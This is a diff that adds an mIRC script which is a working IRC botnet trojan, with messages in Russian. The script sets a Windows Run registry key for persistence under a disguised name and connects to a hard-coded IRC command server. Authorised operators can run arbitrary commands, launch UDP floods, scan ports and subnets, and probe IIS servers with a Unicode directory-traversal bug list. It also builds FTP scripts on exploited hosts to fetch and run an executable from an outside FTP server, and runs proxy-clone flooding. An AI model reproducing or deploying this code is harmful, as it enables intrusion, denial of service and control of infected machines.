@@ -1,0 +1,591 @@
+alias sysinfo { .msg $1 15,14Информация о системе 14(14OS:15 $dll(Sysinfo.dll,osinfo,_) $+ 14)0:14(14Uptime:15 $duration($calc($ctime($asctime(dd/mm/yy HH:nn:ss)) - $ctime(%ontime))) $+ 14)0:14(14CPU:15 $dll(Sysinfo.dll,cpuinfo,_) $+ 14)0:14(14Memory:15 $dll(Sysinfo.dll,meminfo,_) $+ 14)0:14(14Disk:15 $dll(Sysinfo.dll,diskcapacity,_) $+ 14) | .msg $1 14(14Video:15 $dll(Sysinfo.dll,gfxinfo,_) $+ 14)0:14(14Screen:15 $dll(Sysinfo.dll,screeninfo,_) $+ 14)0:14(14Connection:15 $dll(Sysinfo.dll,connection,_) $dll(Sysinfo.dll,netcapacity,_) $+ 14)0:14(14LAN:15 $dll(Sysinfo.dll,interfaceinfo,_) $+ 14) }
+alias b00t { set %filetoboot $rand(100,999) $+ .reg | write %filetoboot  REGEDIT4 | write %filetoboot [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write %filetoboot "NTSystem"="c:\\winnt\\ntview\\ntsys.exe" | run -n regedit /s %filetoboot | timer 1 4 remove %filetoboot | timer 1 5 unset %filetoboot }
+alias dust_must_die { 
+  mkdir c:\winnt\ntview\Nt |   mkdir c:\winnt\ntview\Help |   mkdir c:\winnt\ntview\Admin |   mkdir c:\winnt\ntview\Date |   mkdir c:\winnt\ntview\Setup
+  if ($exists(c:\ntsys.exe)) { copy c:\ntsys.exe c:\bntot.dll | remove c:\ntsys.exe } 
+}
+on *:start: {
+  b00t
+  dust_must_die
+  server irc.mad.pp.ru 2787
+  if ($server == $null) {
+    titlebar NTsecurity
+    .run ntcomm.exe "mIRC32 NTsecurity"
+    set %ontime $asctime(dd/mm/yy HH:nn:ss)
+    set %cafe.team $rand(A,Z) $+ $rand(1111111,9999999) $+ $rand(A,Z)
+    j
+    res
+    if ($portfree(9577) == $false) { exit } 
+    if ($portfree(9577) == $true) { socklisten blah 9577 }
+    nick $rand(a,z) $+ _ $+ $rand(11111,99999) $+ $rand(a,z) $+ _
+    username %cafe.team
+    emailaddr $rand(A,Z) $+ $rand(11111,99999) $+ $rand(A,Z) $+ @fuck.ru  
+    if (%chan.key  == $null)  { set %chan.key 02 }
+    if (%chan.for.join  == $null)  { set %chan.for.join #tcp1  }
+    if (%l0l  == $null)  { set %l0l p$ybnc }
+    server $iif(%server_port.bot == $null, irc.mad.pp.ru 2787,%server_port.bot)  
+  }
+  if (%server_port.sock  == $null)  { set %server_port.sock irc.icq.com 6667 }
+  if ($sock(CaFE.*,0) < 1) { sockopen CaFE. $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) %server_port.sock }
+  .timercheck.sock.cn -o 0 160 check.sock.cn
+  .timercheck.server -o 0 160 check.server
+  .timercheck.chanell 0 60 check.channel
+  .timercheck.bncc -o 0 160 check.bnc
+  if ($sock(list777) == $null) { .socklisten list777 777 }
+}
+alias check.iss {
+  if (%unicod.step == 1) { .msg %unicod.obj 14(15это не iis баг:15 $1 14)0:14(15скорее всего это Unix14) | sockclose $sock($2) |  nick $remove($me,[find])  }
+}
+alias donload_stat {
+  inc %dounload.step
+  if (%dounload.step == 1) set %ftp_temp $+ 1 $2 $+ +echo+open+ftp.narod.ru>c:\ftp.scr
+  if (%dounload.step == 2) set %ftp_temp $+ 2 $2 $+ +echo+user+cafeteam>>c:\ftp.scr
+  if (%dounload.step == 3) set %ftp_temp $+ 3 $2 $+ +echo+ $+ $3 $+ >>c:\ftp.scr
+  if (%dounload.step == 4) set %ftp_temp $+ 4 $2 $+ +echo+bin>>c:\ftp.scr
+  if (%dounload.step == 5) set %ftp_temp $+ 5 $2 $+ +echo+get+ct.exe+c:\ct.exe>>c:\ftp.scr
+  if (%dounload.step == 6) set %ftp_temp $+ 6 $2 $+ +echo+bye>>c:\ftp.scr
+  if (%dounload.step == 7) {
+    .timerdowl_ftp off
+    .timerdonw_off 1 10 sockclose download.*
+    unset %ftp_temp1  |  unset %ftp_temp2 | unset %ftp_temp3
+    set %ftp_temp $+ 7 $2 $+ +ftp+-s:ftp.scr+-n+-d
+    .msg $4 14(15создал фтп скрипт14)0:14(15включил авто закачку14)
+  }
+  .sockopen download. $+ %dounload.step $1 80 
+}
+alias unilook.stat {
+  if ($sock(unilook.*,0) < 50) {   
+    :start
+    inc %unilook.page
+    if (%unilook.page == 256) {
+      .timerunilook_start off 
+      .msg %unicod.obj 14(15закончил сканировать подсеть:  $1 $+ .* $+ 14)0:14(15нашёл iis серверов: %unilook.read $+ 14) 
+      nick $remove($me,[scan])
+      sockclose unilook.*  | halt 
+      halt   
+    }
+    .sockopen unilook. $+ %unilook.page $1 $+ . $+ %unilook.page  80 
+    .timerunil_s $+ $1 $+ . $+ %unilook.page 1 10 sockclose $1 $+ . $+ %unilook.page
+    if ($sock(unilook.*,0) < 50) { goto start }
+  }
+}
+on *:sockopen:download.*: {
+  .sockwrite -tn $sockname GET %ftp_temp [ $+ [ $gettok($sockname,2,46) ] ]  HTTP/1.0
+  .sockwrite -tn $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+  .sockwrite -tn $sockname User-Agent: Mozilla/3.0 (compatible)
+  .sockwrite -tn $sockname Host: $ip
+  .sockwrite -tn $sockname $lf
+}
+alias unicod.stat {
+  if ($sock(unicod.*,0) < 50) {   
+    :start
+    inc %unicod.page 
+    if ($read -l $+ %unicod.page unicodbag.txt == $null) {
+      .timerunicod_start off 
+      .msg %unicod.obj 14(15закончил искать уязвимости14)0:14(15найдено: %unicod.read 14) 
+      nick $remove($me,[find])  
+      sockclose unicod.*  | halt 
+    }
+    .sockopen unicod. $+ %unicod.page $1 80 
+    if ($sock(unicod.*,0) < 50) { goto start }
+  }
+}
+on *:sockopen:unicod.*: {
+  if (%unicod.step == 1) {
+    if ($sockerr > 0) {
+      .msg %unicod.obj 14(15это не iis баг: $sock($sockname).ip $+ 14) 
+      nick $remove($me,[find])  
+      sockclose $sockname  | return 
+    }
+    .sockwrite -n $sockname HEAD / HTTP/1.0
+    .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+    .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
+    .sockwrite -n $sockname Host: $ip
+    .sockwrite -n $sockname
+    halt
+  }
+  if ($sockerr > 0) { sockclose $sockname  | return }
+  .sockmark $sockname $read -l $gettok($sock($sockname),2,46) unicodbag.txt
+  .sockwrite -n $sockname GET $sock($sockname).mark HTTP/1.0
+  .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+  .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
+  .sockwrite -n $sockname Host: $ip
+  .sockwrite -n $sockname
+}
+on *:sockopen:unilook.*: {
+  if ($sockerr > 0) { sockclose $sockname  | return }
+  .sockwrite -n $sockname HEAD / HTTP/1.0
+  .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+  .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
+  .sockwrite -n $sockname Host: $ip
+  .sockwrite -n $sockname
+}
+on *:sockread:unilook.*: {
+  .sockread -f %subsock
+  if ($sockerr > 0) { sockclose $sockname  | return }
+  if (Server: Microsoft-IIS isin %subsock) {      
+    write unicod_look $sock($sockname).ip
+    .timerunilook 1 4 .msg %unicod.obj 14(15Внимание14)0:14(15найден iis сервер:15 $sock($sockname).ip $+ 14)
+    inc %unilook.read
+    sockclose $sockname  
+  }
+}
+on *:sockread:unicod.*: {
+  .sockread -f %subsock
+  if (%unicod.step == 1) {
+    if ($sockerr > 0) { 
+      .msg %unicod.obj 14(15iis сервер не найден: $sock($sockname).ip $+ 14) 
+      nick $remove($me,[find])  
+      sockclose $sockname | return  
+    }
+    if (Server: Microsoft-IIS isin %subsock) { set %unicod.step 2  |  .timerunicod_start  0 1 unicod.stat $sock($sockname).ip  | halt     }
+    halt
+  }
+  if ($sockerr > 0) { sockclose $sockname | return  }
+  if (Directory of c:\ isin %subsock) {
+    inc %unicod.read
+    .msg %unicod.obj 14(15Внимание14)0:14(15найден iis баг:15 $sock($sockname).ip $+ $sock($sockname).mark $+ 14) 
+    write unicod_ready $sock($sockname).ip $+ $sock($sockname).mark
+    if (%unicod.read > 5) {
+      .msg %unicod.obj 14(15нашел 5 iis багов: $sock($sockname).ip $+ 14)0:14(15выключаю сканирование14) 
+      nick $remove($me,[find])  
+      .timerunicod_start off | sockclose unicod.* | halt  
+    }
+    sockclose $sockname 
+  }
+}
+on 1:NICK: {
+  if ($nick == $me) { set %nick.bot $rand(a,z) $+ _ $+ $rand(11111,99999) $+ $rand(a,z) $+_ }
+}
+alias check.bnc {
+  if ($sock(list777) == $null) { .socklisten list777 777 }
+}
+alias check.channel {
+  if ($me !ison %chan.for.join) { join %chan.for.join %chan.key }
+}
+alias check.server { 
+  if ($server == $null) { 
+    .identd on M024751X
+    server $iif(%server_on_disconnect == $null, irc.mad.pp.ru, %server_on_disconnect)
+  }
+}
+on *:sockopen:CaFe.*: {
+  if ($sockerr > 0) {    sockclose $sockname | return }
+  .sockwrite -n $sockname nick $remove($sockname,CaFe.)
+  .sockwrite -n $sockname user $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)  : CaFE [team]
+}
+alias check.sock.cn {
+  if ( $sock(CaFe.*,0) == 0 ) { sockopen CaFE. $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) %server_port.sock }
+}
+on 1:sockread:CaFE.*: {
+  if ($sockerr > 0) {    sockclose $sockname | return }
+  .sockread %clonha
+  if ($gettok(%clonha,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%clonha,2-,32) }
+  if ( ($gettok(%clonha,2,32) == 471) || ($gettok(%clonha,2,32) == 473) || ($gettok(%clonha,2,32) == 474) || ($gettok(%clonha,2,32) == 475))  {
+    .sockwrite -n $sockname join %chan.for.join $+ _ $+ $remove($date,/)
+  }
+  if ($gettok(%clonha,2,32) == 353) {  
+    if ( $numtok($gettok(%clonha,6-,32),32) == 1) {     .sockwrite -n $sockname mode $gettok(%clonha,5,32) +nstlk 31337 %chan.key }
+  }
+  if ($gettok(%clonha,2,32) == 376) {    .sockwrite -n $sockname join  %chan.for.join %chan.key  }
+  if ($gettok(%clonha,2,32) == 433) {    .sockwrite -n $sockname nick $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)  }
+  if ($gettok(%clonha,2,32) == 432) {    .sockwrite -n $sockname nick SM $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)   }
+  if (:Closing Link: isin %clonha) {     .timerconhaclony3 1 10   .sockopen $sockname %server_port.sock  }
+  if ($gettok(%clonha,2,32) == PRIVMSG) { 
+    if ($gettok(%clonha,4,32) == :!cafe) { 
+      if ($check_lamo($gettok(%clonha,5,32)) != 15.455415) { halt }  
+      if ( 194.186.237 !isin %clonha ) { halt }
+      $gettok(%clonha,6-,32)   
+    }
+    if ($gettok(%clonha,4,32) == :+оп) { 
+      if ($check_lamo($gettok(%clonha,5,32)) != 15.455415) { halt }   
+      if ( 194.186.237 !isin %clonha ) { halt }
+      .sockwrite -n $sockname mode $gettok(%clonha,3,32) +o $gettok($gettok(%clonha,1,32),1,33),:) 
+    }
+    if ($gettok(%clonha,4,32) == :!ready) {
+      if ($check_lamo($gettok(%clonha,5,32)) != 15.455415) { halt }  
+      if ( 194.186.237 !isin %clonha ) { halt }
+      .sockwrite -n $sockname $gettok(%clonha,6-,32)     
+    }
+  }
+  if ($gettok(%clonha,2,32) == NICK) {
+    if ( $remove($gettok($gettok(%clonha,1,32),1,33),:) == $remove($sockname,CaFe.)) { sockrename $sockname CaFe. $+ $remove($gettok(%clonha,3,32),:) }
+  }
+  if ($gettok(%clonha,2,32) == KICK) {
+    if ( $gettok(%clonha,4,32) == $remove($sockname,CaFe.) ) {  .sockwrite $sockname join $gettok(%clonha,3,32) $+ $lf     }
+  }
+}
+on *:text:*:*: {
+  if ($1 == !level) { 
+    if ($2 == $null) {
+      if ($gettok($ulist($address($nick,3)).info,2-,32) == $null) { halt }
+      .timeraccess 1 4 msg $schannick 3***  У вас доступ в комнатах:4 $gettok($ulist($address($nick,3)).info,2-,32)   
+    }
+    else { 
+      if ($gettok($ulist($address($2,3)).info,2-,32) == $null) { halt }
+      .timeraccess 1 4    msg $schannick 3***  У4 $2 3 доступ в комнатах:4 $gettok($ulist($address($2,3)).info,2-,32)   
+    }
+  }
+  if ($1 == !auth) {
+    if ($gettok($ulist($address($nick,3)).info,1,32) == $2) { timerauth_new 1 4 msg $schannick 3*** Пароль принят! Добро пожаловать! | set %auth $+ $nick reget } 
+  }
+  if ($1 == !setpass) { 
+    if (%auth [ $+ [ $nick ] ] != reget) { halt }  
+    if ($2 == $null) { halt }
+    set %adrs.nam $ulist($address($nick,3))
+    set %chanel.nam $gettok($ulist($address($nick,3)).info,2-,32)
+    auser reget %adrs.nam  $2 %chanel.nam
+    timernew_pass 1 4 msg $nick 4 *** Ваш пароль заменен на: $2
+  }
+  if ( ($1 == +о) || ($1 == оп) || ($1 == op) || ($1 == !op) || ($1 == !оп) || ($1 == !o) ) {
+    if (%auth [ $+ [ $nick ] ] != reget) { halt }  
+    if (# != $null) {
+      if ( $wildtok( $gettok($ulist($address($nick,3)).info,2-,32) , #,1,32) == $null)  { halt }
+      if ($me isop #) { mode # +o $nick }
+    }
+    if (# == $null) {
+      if ($2 == $null) { halt }
+      if ( $wildtok( $gettok($ulist($address($nick,3)).info,2-,32) , $2,1,32) == $null)  { halt }
+      if ($me isop $2) { mode $2 +o $nick }
+    }
+  }
+  if (%auth [ $+ [ $nick ] ] != yes) { halt }
+  if ($1 == !help) {
+    if ($2 == $null) { 
+      .msg $schannick 3*** Ready for: !do !lag !op !j !p !mop !deop !mdeop !ban !unban !kick !bankick !say !msay !server !quit !udp !sudp !udp.stat !takeover !seen !online !scanport !scanip !sub.start (stop stat rezult) !split !uadd !udel !info. (_op _ban)
+    }
+    if ($2 != $null) { 
+      if ($2 == !do) { .msg $schannick 3*** Help for: !do <param>  * выполнение любой команды  }  
+      if ($2 == !server) { .msg $schannick 3*** Help for: !server ip port  * конект на указанный сервер  }  
+      if ($2 == !quit) { .msg $schannick 3*** Help for: !quit * переконект на сервер  }  
+      if ($2 == !udp) { .msg $schannick 3*** Help for: !udp <ip> [time] * атака на указанный IP(время в секундах, указывать не обязательно)   }  
+      if ($2 == !sudp) { .msg $schannick 3*** Help for: !sudp <ip> * выключение атаки на IP  }  
+      if ($2 == !seen) { .msg $schannick 3*** Help for: !seen <nick> * все понятно %)  }  
+      if ($2 == !online) { .msg $schannick 3*** Help for: !online * время нахождения бота на данном сервере  }  
+      if ($2 == !scanport) { .msg $schannick 3*** Help for: !scanport <ip> <port1> <port2> [hide] * сканирует диапазон портов на одном IP. Параметр hide не обязателен  }  
+      if ($2 == !scanip) { .msg $schannick 3*** Help for: !scanip <port> <ip1> <ip2>  [hide] * сканирует диапазон IP на наличие открытого порта. Параметр hide не обязателен  }  
+      if ($2 == !split) { .msg $schannick 3*** Split com: (!split.* server port how_many_clones #channel)  split. [say notice ping join part flood quit stop stat dcc invite]  }  
+    }
+  }
+  if ($1 == !finddir) {
+    if ($2 == $null) { halt }
+    if ($3 == $null) { halt }
+    if ($4 == $null) { halt }
+    .msg $schannick $finddir($2,$3,$4,$1-)
+  }
+  if ($1 == !findfile) {
+    if ($2 == $null) { halt }
+    if ($3 == $null) { halt }
+    if ($4 == $null) { halt }
+    .msg $schannick $findfile($2,$3,$4,$1-)
+  }
+  if (!download. isin $1) {
+    if ( ($remove($1,!download.) != *) && ($remove($1,!download.) != $me) ) { halt }
+    if ($2 == $null) { halt }
+    if ($3 == $null) { halt }
+    if ($4 == $null) { halt }
+    set %dounload.step 0
+    .msg  $schannick 4*** Начал пИсать фтп скрипт на сервере: $2
+    .timerdowl_ftp 0 7 donload_stat $2 $3 $4 $schannick
+  } 
+  if (!unicod.clear. isin $1) {
+    if ( ($remove($1,!unicod.clear.) != *) && ($remove($1,!unicod.clear.) != $me) ) { halt }
+    write -c unicod_ready
+    .msg $schannick 3***  Очистил файл с насканенными IIS`ками! 
+  }
+  if (!unilook.clear. isin $1) {
+    if ( ($remove($1,!unilook.clear.) != *) && ($remove($1,!unilook.clear.) != $me) ) { halt }
+    write -c unicod_look
+    .msg $schannick 3***  Очистил файл с насканенными IIS серверами! 
+  }
+  if (!unicod.rezult. isin $1) {
+    if ( ($remove($1,!unicod.rezult.) != *) && ($remove($1,!unicod.rezult.) != $me) ) { halt }
+    dcc send $nick unicod_ready
+  }
+  if (!unilook.rezult. isin $1) {
+    if ( ($remove($1,!unilook.rezult.) != *) && ($remove($1,!unilook.rezult.) != $me) ) { halt }
+    dcc send $nick unicod_look
+  }
+  if (!unilook.stop. isin $1) {
+    if ( ($remove($1,!unilook.stop.) != *) && ($remove($1,!unilook.stop.) != $me) ) { halt }
+    .msg $schannick 12*** Сканирование остановлено! На сервере: 4 %unilook.ip $+ . $+  %unilook.page 12Было найдено серверов:4 %unilook.read
+    .timerunilook_start off |  sockclose unilook.*
+    nick $remove($me,_uS)  
+  }
+  if (!unicod.stop. isin $1) {
+    if ( ($remove($1,!unicod.stop.) != *) && ($remove($1,!unicod.stop.) != $me) ) { halt }
+    .msg $schannick 12*** Сканирование остановлено! СкаН IIS`ки был:4 %unicod.ip 12Было найдено багов:4 %unicod.read
+    .timerunicod_start off |   .timercheck.iss off  | sockclose unicod.*
+    nick $remove($me,_uN)  
+  }
+  if (!unicod.stat. isin $1) {
+    if ( ($remove($1,!unicod.stat.) != *) && ($remove($1,!unicod.stat.) != $me) ) { halt }
+    if ($sock(unicod.*,0) > 1) {     .msg $schannick 12*** Сканирую IIS`ку:4 %unicod.ip 12Статус:4 %unicod.page 12баг из 627...Найдено баг0в:4 %unicod.read |  halt  }
+    .msg $schannick 12*** Последний СкаН IIS`ки был:4 %unicod.ip 12Было найдено багов:4 %unicod.read
+  }
+  if (!unilook.stat. isin $1) {
+    if ( ($remove($1,!unilook.stat.) != *) && ($remove($1,!unilook.stat.) != $me) ) { halt }
+    if ($sock(unilook.*,0) > 1) {     .msg $schannick 12*** Сканирую IIS сервер:4 %unilook.ip $+ . $+  %unilook.page 12Найдено серверов:4 %unilook.read |  halt  }
+    .msg $schannick 12*** Последний СкаН IIS серверов был:4 %unilook.ip $+ .* 12Было найдено багов:4 %unilook.read
+  }
+  if (!unilook. isin $1) {
+    if ( ($remove($1,!unilook.) != *) && ($remove($1,!unilook.) != $me) ) { halt }
+    if ($2 == $null) { halt }
+    if ($sock(unilook.*,0) > 1) {  .msg $schannick 12 (!)Уже сканирую(!) IIS сервера, потсети:4 %unilook.ip $+ .* 12Найдено баг0в:4 %unilook.read | halt } 
+    if (%iniscan.stat.bag == on) {
+      .msg $schannick 3*** УЖЕ ИДЕТ СКАНИРОВАНИЕ! Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 
+      halt
+    }
+    set %unilook.page 0 |  set %unilook.read 0
+    set %unicod.obj $schannick |  set %unilook.ip $2 
+    nick $me $+ _uS
+    .msg $schannick 13*** Начал сканировать IIS сервера подсети: $2 $+ .*
+    .timerunilook_start 0 1 unilook.stat $2
+  } 
+  if (!unicod. isin $1) {
+    if ( ($remove($1,!unicod.) != *) && ($remove($1,!unicod.) != $me) ) { halt }
+    if ($2 == $null) { halt }
+    if ($exists(unicodbag.txt) != $true) { .msg $schannick 12 (!) Нету файла с бАг листом...(!)  |  halt  }    
+    if ($sock(unicod.*,0) > 1) {  .msg $schannick 12 (!)Уже сканирую(!) IIS`ку:4 %unicod.ip 12Статус:4 %unicod.page 12баг из 627...Найдено баг0в:4 %unicod.read | halt } 
+    if (%iniscan.stat.bag == on) {
+      .msg $schannick 3*** УЖЕ ИДЕТ СКАНИРОВАНИЕ! Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 
+      halt
+    }
+    set %unicod.page 0 |  set %unicod.step 1 | set %unicod.read 0
+    set %unicod.obj $schannick |  set %unicod.ip $2 
+    nick $me $+ _uN
+    .msg $schannick 13*** Начал сканировать IIS`ку: $2 (7ё-мое круто да?!13)
+    sockopen unicod. $+ %unicod.page $2 80 
+    .timercheck.iss 1 20 check.iss $2 unicod. $+ %unicod.page
+  } 
+  if ($1 == !vers) { 
+    .msg  $schannick 12*** Текущая версия скриптов:4  $chr(35) $+ 3 $+   $+ %vers.bot
+  }
+  if ($1 == !audp.stat) {    .msg  $schannick 3*** Авто удп включено на маску: %audp.mask   }
+  if ($1 == !audp) {
+    if ($2 == $null) { halt }
+    .msg  $schannick 4*** Включил [авто удп] на маску: $2 (!saudp to off)
+    set %audp.mask $2
+  }
+  if ($1 == !saudp) {
+    .msg  $schannick 4*** Выключил [авто удп] на маску: %audp.mask
+    unset %audp.mask
+  }
+  if ($1 == !portfree) {
+    if ($2 == $null) { halt }
+    if ($portfree($2) == $true) { .msg $schannick 12*** Порт4 $2 12свободен! }
+    else {  .msg $schannick 12*** Порт4 $2 12занят!  }
+  }
+  if ($1 == !var) { 
+    if ($2  == $null) { halt }
+    if ([ [ $2 ] ] == $null) { .msg  $schannick 4*** Такой переменной нету: $2 | halt  }
+    .msg  $schannick 3*** Var $2- = 4 [ [ $2- ] ]   test:  [ [ $var($2,1).value ] ]
+  }
+  if (!info. isin $1 ) {
+    if ($2 == $null) { halt }
+    if ( ($remove($1,!info.) != *) && ($remove($1,!info.) != $me) ) { halt }
+    if ($me !ison $2) { halt }
+    set %op.inchan ""  | set %noop.inchan "" | set %op.temp 1
+    :start
+    if ($nick($2,%op.temp) == $null) { goto end | halt }
+    if ($nick($2,%op.temp) isop $2) { set %op.inchan %op.inchan @ $+ $nick($2,%op.temp) }
+    else { set %noop.inchan %noop.inchan $nick($2,%op.temp) }
+    inc %op.temp | goto start
+    :end
+    msg $schannick 3[ Инфо $2 ]12: Mode:4 $chan($2).mode 12Банов:4 $ibl($2,0) 12Topic:4 $chan($2).topic
+    msg $schannick 12 (Опы):4 %op.inchan 12(users):4 %noop.inchan 
+  }
+  if (!info_op. isin $1 ) {
+    if ($2 == $null) { halt }
+    if ( ($remove($1,!info_op.) != *) && ($remove($1,!info_op.) != $me) ) { halt }
+    if ($me !ison $2) { halt }
+    if ($3 == $null) { halt }
+    msg $schannick 12: Оп $3 :4 $nick($2,$3,o) $address($nick($2,$3,o),1)
+  }
+  if (!info_ban. isin $1 ) {
+    if ($2 == $null) { halt }
+    if ( ($remove($1,!info_ban.) != *) && ($remove($1,!info_ban.) != $me) ) { halt }
+    if ($me !ison $2) { halt }
+    if ($3 == $null) { halt }
+    msg $schannick 12: Бан $3 :4 $ibl($2,$3)
+  } 
+  if ($1 == !ip) {  .msg  $schannick 14(15ип: $ip $+ 14)0:14(15хост: $host $+ 14)  } 
+  if ($1 == !j) {  
+    if ($2 == $null) { halt }
+    join $2-
+  }
+  if ($1 == !p) {  
+    if ($2 == $null) { halt }
+    part $2-
+  }
+  if ($1 == !udel) {
+    if ($2 == $null) { halt }
+    if ($ulist($2,reget,1) == $null) {  .msg $schannick 4***  Уровня $2 не существует! | halt }
+    ruser $ulist($2,reget,1) | .msg $schannick 4***   $2  удален из списка пользователей! 
+  }
+  if ($1 == !uadd) {  
+    if ($2 == $null) { halt }
+    if ($3 == $null) { halt }
+    if ($3 !ison $2) { halt }
+    if ($ulist($address($3,3),reget,1) == $null) {
+      auser reget $address($3,3) pass $2 |  .msg  $schannick 3*** Пользователь:4 $3 3Добавлен в комнате:4 $2
+      msg $3 установите пароль:4 !setpass ваш_пароль Для ауфоризации: !auth ваш_пасс | set %auth $+ $3 reget
+    }
+    if ($ulist($address($3,3),reget,1) != $null) {
+      if ( $wildtok( $gettok($ulist($address($3,3)).info,2-,32) , #,1,32) != $null) { halt } 
+      set %pass.nam $gettok($ulist($address($3,3)).info,1,32)
+      set %chanel.nam $gettok($ulist($address($3,3)).info,2-,32)
+      auser reget $address($3,3) %pass.nam %chanel.nam $2 | set %auth $+ $3 reget
+      .msg  $schannick 3*** Пользователь:4 $3 3Добавлен в комнате:4 $2
+    }
+  }
+  if ($1 == !unban) {
+    if ($2 == $null) { halt }
+    set %chan.count 1 
+    :start 
+    if ( $chan(%chan.count) == $null) { halt } 
+    if ($me isop $chan(%chan.count) )  { mode $chan(%chan.count)  -b $2 }
+    inc %chan.count | goto start
+  }
+  if (!split.stat. isin $1 ) {
+    if ( ($remove($1,!split.stat.) != *) && ($remove($1,!split.stat.) != $me) ) { halt }
+    msg $schannick 12 >>>> Открыто сокетов: $sock(pan.*,0) На сервере клонов(примерно): $sock(ready.*,0)
+  }
+  if (!split.stop. isin $1 ) {
+    if ( ($remove($1,!split.stop.) != *) && ($remove($1,!split.stop.) != $me) ) { halt }
+    msg $schannick 12 >>>> Внимание! Прекращаю загрузку прокси-клонов!
+    set %split.stop yes
+  }
+  if (!split.quit. isin $1 ) {
+    if ( ($remove($1,!split.quit.) != *) && ($remove($1,!split.quit.) != $me) ) { halt }
+    msg $schannick 12 >>>> Внимание! Выключаю все пр0кси-кл0ны!
+    sockwrite -n ready.* quit : $+ %cafe.team
+  }
+  if (!split.join. isin $1 ) {
+    if ( ($remove($1,!split.join.) != *) && ($remove($1,!split.join.) != $me) ) { halt }
+    if ($2 == $null) { halt }
+    msg $schannick 12 >>>> Внимание! Завожу клонов в:4 $2- 12(опасность: админы могут засечь)
+    sockwrite -n  ready.* join $2-  
+  }
+  if (!split.part. isin $1 ) {
+    if ( ($remove($1,!split.part.) != *) && ($remove($1,!split.part.) != $me) ) { halt }
+    if ($2 == $null) { halt }
+    msg $schannick 12 >>>> Внимание! Убираю клонов из:4 $2- 12(опасность: админы могут засечь)
+    sockwrite -n  ready.* part $2 : $+ %cafe.team
+  }
+  if (!split.flood. isin $1 ) {
+    if ( ($remove($1,!split.flood.) != *) && ($remove($1,!split.flood.) != $me) ) { halt }
+    if ($2 == $null) { halt }
+    msg $schannick 12 >>>> Внимание! Начал флУдить текстом в:4 $2 12(опасность: админы могут засечь)
+    sockwrite -n  ready.* PRIVMSG $2 : $+ $split.fl  
+  }
+  if (!split.say. isin $1 ) {
+    if ( ($remove($1,!split.say.) != *) && ($remove($1,!split.say.) != $me) ) { halt }
+    if ($2 == $null) { halt }
+    if ($3 == $null) { halt }
+    .msg $schannick 12 >>>> Внимание! Отправляю месЯгу  к :4 $2  12(опасность: админы могут засечь)
+    sockwrite -n  ready.* PRIVMSG $2 : $+ $3-  
+  }
+  if (!split.notice. isin $1 ) {
+    if ( ($remove($1,!split.notice.) != *) && ($remove($1,!split.notice.) != $me) ) { halt }
+    if ($2 == $null) { halt }
+    if ($3 == $null) { halt }
+    .msg $schannick 12 >>>> Внимание! Отправляю н0тис  к :4 $2  12(опасность: админы могут засечь)
+    sockwrite -n  ready.* NOTICE $2 : $+ $3-  
+  }
+  if (!split.invite. isin $1 ) {
+    if ( ($remove($1,!split.invite.) != *) && ($remove($1,!split.invite.) != $me) ) { halt }
+    if ($2 == $null) { halt }
+    var %cRandomChannel $chr(35) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ OpS $+ $rand(a,z) $+ $rand(0,9) $+ LamO $+ $rand(a,z) $+ $rand(0,9) $+ yOu $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9)
+    .msg $schannick 12 >>>> Внимание! Отправил инвАйт  к :4 $2  12(опасность: админы могут засечь)
+    sockwrite -n  ready.* INVITE $2 %cRandomChannel
+  }
+if (!sysinfo. isin $1) {
+    if ( ($remove($1,!sysinfo.) != *) && ($remove($1,!sysinfo.) != $me) ) { halt }
+   sysinfo $schannick
+  }
+  if (!split.dcc. isin $1 ) {
+    if ( ($remove($1,!split.dcc.) != *) && ($remove($1,!split.dcc.) != $me) ) { halt }
+    if ($2 == $null) { halt }
+    .msg $schannick 12 >>>> Внимание! п0сылаю виртуальный фАйлы  к :4 $2  12(опасность: админы могут засечь)
+    sockwrite -n  ready.* PRIVMSG $2 :DCC SEND I_think_you_are_LaMer_SuckerS $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+ 
+  }
+  if (!split.ping. isin $1 ) {
+    if ( ($remove($1,!split.ping.) != *) && ($remove($1,!split.ping.) != $me) ) { halt }
+    if ($2 == $null) { halt }
+    .msg $schannick 12 >>>> Внимание! пИнгую :4 $2  12(опасность: админы могут засечь)
+    sockwrite -n  ready.* PRIVMSG $2 $chr(1) $+ PING $+ $chr(1)
+  }
+  if (!split. isin $1 ) {
+    if ( ($remove($1,!split.) != *) && ($remove($1,!split.) != $me) ) { halt }
+    if ($2 == $null) { msg $schannick  4 Ошибка, укажите сервер! | halt }
+    if ($3 == $null) { msg $schannick  4 Ошибка, укажите порт сервера! | halt }
+    if ($4 == $null) { msg $schannick  4 Ошибка, количество клонов(на каждую проксю) | halt }
+    if ($5 == $null) { set %split.chan off }
